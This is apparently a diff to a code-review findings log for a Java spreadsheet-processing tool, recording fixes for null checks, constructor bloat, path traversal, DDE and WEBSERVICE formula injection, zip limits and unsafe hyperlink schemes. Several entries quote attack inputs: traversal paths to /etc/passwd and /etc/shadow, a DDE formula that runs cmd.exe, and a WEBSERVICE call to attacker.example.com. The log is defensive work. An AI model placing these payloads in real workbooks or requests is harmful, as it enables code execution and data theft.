@@ -144,3 +144,258 @@ test to check for the complete expression and add negative guard for the
 old incomplete 3-license string.
 EFFORT: TRIVIAL
 ------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: B3K8P2L
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: cli/src/main/java/dev/erst/gridgrind/cli/GridGrindCli.java:30-109
+CATEGORY: MAINTAINABILITY
+OBSERVATION: GridGrindCli carried 6 intermediate package-private constructors forming a god-constructor
+cascade (AGENTS_JAVA26 §11.3). Four tests verified constructor argument counts by name rather than
+observable behavior (AGENTS_JAVA26 §10.3), coupling the test suite to implementation structure.
+CURRENT: 8 constructors total; tests named threeArgumentConstructor*, fourArgumentConstructor*, etc.
+FIX: Removed the 6 intermediate constructors; added two static forTesting() factory methods covering
+the two needed test-surface shapes (executor-only, executor+interactivity). Deleted the 4 structure
+tests. Updated 7 test call sites across GridGrindCliFailureClassificationTest, GridGrindCliCatalogCommandTest,
+GridGrindCliInvocationTest, and StandardInputInteractivityTest.
+EFFORT: MINOR
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: N6T1W4Q
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: scripts/verify-cli-contract.sh:360-405
+CATEGORY: MAINTAINABILITY
+OBSERVATION: 8 hardcoded string literals in required_protocol_help_snippets and required_guidance_help_snippets
+were parallel definitions of facts owned by CLI source/resource files (UEC §5 canonical ownership).
+The STREAMING_WRITE scope snippet duplicated constraint terms already verified structurally in the
+catalog checks block (lines 474-484).
+CURRENT: snippet "source.type must be NEW; mutation actions limited to ENSURE_SHEET" hardcoded in
+required_protocol_help_snippets; if catalog or help text renames the term the checks diverge silently.
+FIX: Removed the STREAMING_WRITE prose snippet. Added catalog-derived term checks (ENSURE_SHEET,
+APPEND_ROW) immediately after the existing catalog STREAMING_WRITE block so the canonical source
+(catalog) drives both the structural and the help-text surface verifications.
+EFFORT: MINOR
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: Q7F3M1K
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: engine/src/main/java/dev/erst/gridgrind/excel/ExcelChartSourceSupport.java:210-224
+CATEGORY: DEFECT
+OBSERVATION: ExcelChartSourceSupport.scalarText() called getSheet(reference.getSheetName())
+and immediately chained .getRow() on the result without a null check. POI's getSheet(name)
+returns null for a missing or unrecognised sheet name, and returns an NPE when the sheet name
+itself is null (unqualified CellReference). The ternary guard was on getRow(), not getSheet(),
+so the NPE fired before the ternary could evaluate. The same class already owned a requireSheet()
+private helper used consistently everywhere else.
+CURRENT: sheet.getWorkbook().getSheet(reference.getSheetName()).getRow(reference.getRow()) == null
+FIX: Extract targetSheet using the same null-check pattern as requireAreaReferenceSheet():
+if getSheetName() is null use the context sheet, otherwise call requireSheet(). Added a test
+for the unqualified-reference (null sheet name) branch in ExcelChartFallbackCoverageTest.
+EFFORT: TRIVIAL
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: W2P9R5N
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: engine/src/main/java/dev/erst/gridgrind/excel/ExcelChartSourceSupport.java:47-69,153-157
+CATEGORY: MAINTAINABILITY
+OBSERVATION: Two null-discipline gaps in ExcelChartSourceSupport: (1) the 1-arg scalarFromFormula
+overload lacked Objects.requireNonNull(cell) while the 2-arg overload added it explicitly at line
+326; inconsistency means the contract differs silently between overloads. (2) resolveChartSource
+called resolved.sheet().getRow(reference.getRow()) twice per iteration — once for the null check
+and once for the getCell() call — mirroring the stylistic pattern of the scalarText null-dereference
+bug (Q7F3M1K) even though it was safe because resolved.sheet() is already non-null.
+CURRENT: scalarFromFormula(Cell cell) calls cell.getCachedFormulaResultType() with no prior guard;
+resolveChartSource reads getRow() twice in the ternary.
+FIX: Added Objects.requireNonNull(cell) to the 1-arg scalarFromFormula. Extracted row local in
+resolveChartSource to remove the double getRow() call.
+EFFORT: TRIVIAL
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: S4X2V9K
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: engine/src/main/java/dev/erst/gridgrind/engine/runtime/ExecutionRequestPaths.java:147-153
+CATEGORY: SECURITY
+OBSERVATION: normalizePath(String, Path) resolved and normalized relative paths but performed no
+confinement check. A relative path such as "../../etc/passwd" resolved freely to /etc/passwd
+when the working directory was /app/workspace, enabling path traversal attacks in requests that
+use relative source or persistence paths.
+CURRENT: return workingDirectory.toAbsolutePath().normalize().resolve(candidate).normalize();
+FIX: After resolving, verify the normalized path starts with the normalized working directory
+base; throw IllegalArgumentException for escaping paths. Absolute paths remain allowed.
+Added LIM-025 to LIMITATIONS.md and a regression test in ExecutionPathCoverageTest.
+EFFORT: TRIVIAL
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: F8M3P7Q
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: contract/src/main/java/dev/erst/gridgrind/contract/dto/CellInput.java:59-73
+CATEGORY: SECURITY
+OBSERVATION: CellInput.Formula stripped the leading = but placed no restriction on formulas
+beginning with DDE(. DDE("cmd", "/C calc", "") written to a cell and saved as .xlsx will cause
+Excel to invoke cmd.exe when the workbook is opened on Windows with DDE enabled.
+CURRENT: only checks for blank formula after stripping =
+FIX: After stripping =, check formula.regionMatches(true, 0, "dde(", 0, 4) and throw
+IllegalArgumentException. Added LIM-023 to LIMITATIONS.md and tests in CellInputTest.
+EFFORT: TRIVIAL
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: Z6R1J8L
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: engine/src/main/java/dev/erst/gridgrind/excel/ExcelWorkbookOpenSupport.java
+CATEGORY: SECURITY
+OBSERVATION: GridGrind relied on Apache POI 5.5.1 ZipSecureFile defaults (MIN_INFLATE_RATIO=0.01,
+MAX_ENTRY_SIZE=0xFFFFFFFFL=4GB) without explicitly configuring them. The 4GB MAX_ENTRY_SIZE
+default is far too permissive for a workbook-processing service and was never documented.
+FIX: Added static initializer in ExcelWorkbookOpenSupport that explicitly sets MIN_INFLATE_RATIO=0.01
+and MAX_ENTRY_SIZE=100MiB. Added LIM-026 to LIMITATIONS.md and MAX_ZIP_ENTRY_SIZE constant.
+EFFORT: TRIVIAL
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: T9W5K2M
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: contract/src/main/java/dev/erst/gridgrind/contract/dto/WorkbookPlan.java:244
+CATEGORY: SECURITY
+OBSERVATION: WorkbookPlan.copySteps() validated step IDs and uniqueness but placed no ceiling on
+the total number of steps. A request at the 16MiB JSON cap could include ~200,000 minimal steps,
+each driving a full execution cycle, enabling resource exhaustion that the JSON size cap alone does
+not prevent.
+FIX: Added MAX_STEPS=10_000 constant and size check at the top of copySteps(). Added LIM-024 to
+LIMITATIONS.md and a regression test in WorkbookPlanTest.
+EFFORT: TRIVIAL
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: P3N8Q6R
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: contract/src/main/java/dev/erst/gridgrind/contract/dto/ArrayFormulaInput.java (and 4 other formula input types)
+CATEGORY: SECURITY
+OBSERVATION: The DDE formula injection guard added in LIM-023 (CellInput.Formula) was not applied
+to ArrayFormulaInput, DataValidationRuleInput formula fields, ConditionalFormattingRuleInput
+formula fields, ConditionalFormattingThresholdInput.formula, or ChartDataSourceInput.Reference.formula.
+All of these write user-supplied formula strings directly into xlsx output that Excel evaluates,
+making DDE injection possible through these surfaces even after LIM-023.
+FIX: Created FormulaInputSecurity.rejectDde() shared helper; applied // LIM-027 at all remaining
+formula input sites. Added regression assertions in AdvancedMutationProtocolTypesTest and
+ProtocolResidualCoverageTest.
+EFFORT: LOW
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: H7V2W4X
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: contract/src/main/java/dev/erst/gridgrind/contract/dto/ProtocolHyperlinkSupport.java
+CATEGORY: SECURITY
+OBSERVATION: HyperlinkTarget.Url validation rejected only file: and mailto: schemes; all other URI
+schemes were accepted as valid. Schemes like javascript:, vbscript:, ms-excel:, and ldap: would
+pass validation and be written into xlsx hyperlink records. In browser-based spreadsheet viewers,
+a javascript: hyperlink could trigger XSS; ms-excel: enables protocol-handler abuse; vbscript: can
+execute macros in legacy IE contexts.
+FIX: Added ALLOWED_URL_SCHEMES = {http, https, ftp, ftps} allowlist enforced in isValidUrlTarget()
+and normalizeUrlTarget(); blocked-scheme error message names the rejected scheme. Added LIM-028 to
+LIMITATIONS.md and tests in ProtocolHyperlinkSupportTest.
+EFFORT: TRIVIAL
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: K5M9L3T
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: engine/src/main/java/dev/erst/gridgrind/engine/runtime/ExecutionRequestPaths.java
+CATEGORY: SECURITY
+OBSERVATION: LIM-025 path confinement check used Path.startsWith() (lexicographic only) which does
+not resolve symbolic links. A symlink placed inside the working directory pointing outside it would
+pass the startsWith() check with a normalized path that looks confined, while the actual file-system
+access escapes the boundary. Confirmed by attack probe: Files.isSymbolicLink detects the escape.
+FIX: Added checkNoSymlinkEscape() helper that walks each path component and verifies any symlink
+still resolves within the working directory via toRealPath(). Added LIM-029 to LIMITATIONS.md
+and a test in ExecutionPathCoverageTest using a real temp-dir symlink.
+EFFORT: LOW
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: P8Q3R7S
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: engine/src/main/java/dev/erst/gridgrind/engine/runtime/SourceBackedPathResolver.java
+CATEGORY: SECURITY
+OBSERVATION: SourceBackedPathResolver.resolvePath() resolved TextSourceInput.Utf8File and
+BinarySourceInput.File paths with plain Path.of(rawPath).resolve().normalize() — no confinement
+check and no symlink walk. A caller could submit "../../etc/shadow" or a symlink-based escape as
+a source-file path and read arbitrary server-side file content, which would then appear in cell
+values or formula strings returned in the API response.
+FIX: resolvePath() now delegates entirely to ExecutionRequestPaths.normalizePath() (LIM-025,
+LIM-029), which enforces working-directory confinement and symlink walk. Added LIM-030 to
+LIMITATIONS.md, added SourceBackedPathResolver.resolvePath // LIM-030, and two regression tests
+in ExecutionPathCoverageTest (traversal rejected, in-bounds path allowed).
+EFFORT: LOW
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: N2X6Y1Z
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: contract/src/main/java/dev/erst/gridgrind/contract/dto/FormulaInputSecurity.java
+CATEGORY: SECURITY
+OBSERVATION: FormulaInputSecurity.rejectDde() blocked only the DDE() function (LIM-027). The Excel
+WEBSERVICE() function makes outbound HTTP GET requests when the workbook is opened in Excel,
+allowing a crafted formula to exfiltrate data to an attacker-controlled server without any user
+interaction beyond opening the file. All formula-bearing input types (CellInput.Formula,
+ArrayFormulaInput, DataValidationRuleInput formula fields, ConditionalFormattingRuleInput formula
+fields) were unguarded against WEBSERVICE injection.
+FIX: Extended rejectDde() to also reject formulas whose effective body begins with "webservice("
+(case-insensitive, after stripping leading = or {=…} wrapper). Added LIM-031 to LIMITATIONS.md
+and regression assertions covering all case forms in ProtocolResidualCoverageTest.
+EFFORT: TRIVIAL
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: T4W8X2Y
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: contract/src/main/java/dev/erst/gridgrind/contract/dto/NamedRangeTarget.java
+CATEGORY: SECURITY
+OBSERVATION: NamedRangeTarget.Formula(String formula) stored the formula verbatim with no call to
+FormulaInputSecurity.rejectDde(). Named-range formulas are written into the xlsx defined-names
+part and evaluated automatically by Excel on open or whenever a cell references the range. A
+NamedRangeTarget with {"kind":"FORMULA","formula":"DDE(\"cmd\",\"/C calc\",\"\")"} would bypass
+all existing formula-injection guards (LIM-023, LIM-027, LIM-031) because none of those guards
+are applied at the named-range input layer. The attack succeeds through the FORMULA variant even
+when cell formula input is correctly rejected.
+FIX: Added FormulaInputSecurity.rejectDde(formula) // LIM-032 in NamedRangeTarget.Formula compact
+constructor. Updated FormulaInputSecurity // LIM-032 comment. Added LIM-032 to LIMITATIONS.md.
+Added regression assertions in ProtocolResidualCoverageTest.rejectsFormulaInjectionInNamedRangeChartTitleAndUdfTemplate().
+EFFORT: TRIVIAL
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: V6Z9A3B
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: contract/src/main/java/dev/erst/gridgrind/contract/dto/ChartTitleInput.java
+CATEGORY: SECURITY
+OBSERVATION: ChartTitleInput.Formula(String formula) stored the formula verbatim with no call to
+FormulaInputSecurity.rejectDde(). Chart title formulas are written into the chart XML (<c:f>
+element) and auto-evaluated when Excel renders the chart — which happens on workbook open. A
+chart title with DDE("cmd","/C calc","") or WEBSERVICE("https://attacker.example.com/") executes
+without any user interaction.
+FIX: Added FormulaInputSecurity.rejectDde(formula) // LIM-033 in ChartTitleInput.Formula compact
+constructor. Added LIM-033 to LIMITATIONS.md and regression assertions in ProtocolResidualCoverageTest.
+EFFORT: TRIVIAL
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+ID: C7D1E5F
+DATE: 2026-05-15
+STATUS: ACTIONED
+FILE: contract/src/main/java/dev/erst/gridgrind/contract/dto/FormulaUdfFunctionInput.java
+CATEGORY: SECURITY
+OBSERVATION: FormulaUdfFunctionInput.formulaTemplate had no DDE/WEBSERVICE rejection. Risk is low
+because: (1) POI's formula evaluator doesn't implement DDE or WEBSERVICE server-side; (2) UDF
+templates are never written to xlsx output — only the call site appears in the file. The gap was
+blocked as defense-in-depth against future evaluation paths or POI changes that could implement
+these functions.
+FIX: Added FormulaInputSecurity.rejectDde(formulaTemplate) // LIM-034 after the normalization step
+in the canonical constructor. Added LIM-034 to LIMITATIONS.md and regression assertions.
+EFFORT: TRIVIAL
+------------------------------------------------------------------------
